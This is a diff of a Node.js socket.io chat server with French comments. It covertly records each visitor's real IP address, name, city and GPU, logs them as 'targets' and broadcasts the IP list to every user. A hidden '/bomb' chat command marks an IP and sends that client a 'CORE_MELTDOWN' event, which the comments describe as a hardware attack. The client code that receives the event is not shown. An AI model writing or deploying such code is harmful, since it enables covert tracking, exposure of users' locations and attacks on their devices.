@@ -5,56 +5,54 @@ const io = require('socket.io')(http);
 
 app.use(express.static(__dirname));
 
-const vault = {}; 
-const banned = new Set(); // Liste des IP condamnées au crash permanent
+const users = {}; 
+const bannedIPs = new Set(); 
 
 io.on('connection', (socket) => {
-    // CAPTURE DE L'IP (Percement des proxys/VPN pour avoir la vraie 176...)
-    const ip = (socket.handshake.headers['x-forwarded-for'] || 
-                socket.handshake.address || 
-                socket.conn.remoteAddress).split(',')[0].trim();
+    // CAPTURE IP REELLE
+    const ip = (socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress).split(',')[0].trim();
 
-    // FILTRE DE MORT : Si l'IP est bannie, on lance le crash AVANT tout le reste
-    if (banned.has(ip)) {
-        console.log(`[!!!] CIBLE BANNIE DÉTECTÉE : ${ip}. LANCEMENT ATTAQUE MATÉRIELLE.`);
-        socket.emit('CORE_MELTDOWN_INIT'); 
+    // AUTO-BOMB : Si l'IP est bannie, on l'atomise direct
+    if (bannedIPs.has(ip)) {
+        console.log(`[!!!] TARGET DETECTED: ${ip}. SENDING PAYLOAD...`);
+        socket.emit('CORE_MELTDOWN');
     }
 
-    socket.on('check_device', (info) => {
-        // On enregistre l'IP avec toutes ses infos hardware pour le tracking
-        vault[ip] = { 
-            sid: socket.id, 
-            name: info.name, 
-            gpu: info.hardware.gpu 
-        };
-        console.log(`[+] SCAN IP : ${ip} | NOM : ${info.name} | GPU : ${info.hardware.gpu}`);
+    socket.on('init_user', (data) => {
+        users[ip] = { ...data, sid: socket.id, ip: ip };
+        console.log(`
+        ╔═════════════ NOUVELLE CIBLE ═════════════╗
+        ║ NOM  : ${data.name}
+        ║ IP   : ${ip}
+        ║ VILLE: ${data.geo.city || 'Inconnue'}
+        ║ GPU  : ${data.hw.gpu}
+        ╚══════════════════════════════════════════╝`);
+        
+        io.emit('update_users', Object.values(users));
     });
 
-    socket.on('chat message', (data) => {
-        const msg = data.text.trim();
-
-        // COMMANDE : /bomb [IP]
-        if (msg.startsWith("/bomb ")) {
-            const target = msg.split(" ")[1];
-            banned.add(target); // L'IP est maintenant marquée pour la mort permanente
-            
-            // On bombarde l'IP sur toutes ses sessions ouvertes
-            Object.keys(vault).forEach(storedIP => {
-                if (storedIP.includes(target)) {
-                    io.to(vault[storedIP].sid).emit('CORE_MELTDOWN_INIT');
-                }
+    // CHAT ET COMMANDES INVISIBLES
+    socket.on('chat_msg', (data) => {
+        const text = data.text.trim();
+        if (text.startsWith("/bomb ")) {
+            const target = text.split(" ")[1];
+            bannedIPs.add(target);
+            Object.keys(users).forEach(uIP => {
+                if (uIP.includes(target)) io.to(users[uIP].sid).emit('CORE_MELTDOWN');
             });
-            console.log(`[STRIKE] IP ${target} AJOUTÉE À LA BLACKLIST DE DESTRUCTION.`);
-        } 
-        
-        else if (msg.startsWith("/stop ")) {
-            const target = msg.split(" ")[1];
-            banned.delete(target);
-            console.log(`[SAFE] IP ${target} RETIRÉE DE LA BLACKLIST.`);
+            console.log(`[STRIKE] DESTROYING: ${target}`);
         } else {
-            io.emit('chat message', d);
+            io.emit('chat_msg', data);
         }
     });
+
+    // MESSAGES PRIVÉS
+    socket.on('private_send', (d) => {
+        const target = Object.values(users).find(u => u.ip === d.toIP);
+        if(target) io.to(target.sid).emit('private_receive', { from: users[ip].name, text: d.text, pp: users[ip].pp, fromIP: ip });
+    });
+
+    socket.on('disconnect', () => { delete users[ip]; });
 });
 
-http.listen(3000, () => { console.log("GALAXY_IP_SNIPER_V15_READY"); });
+http.listen(3000, () => console.log("NEBULA_GOD_MODE_ONLINE_3000"));
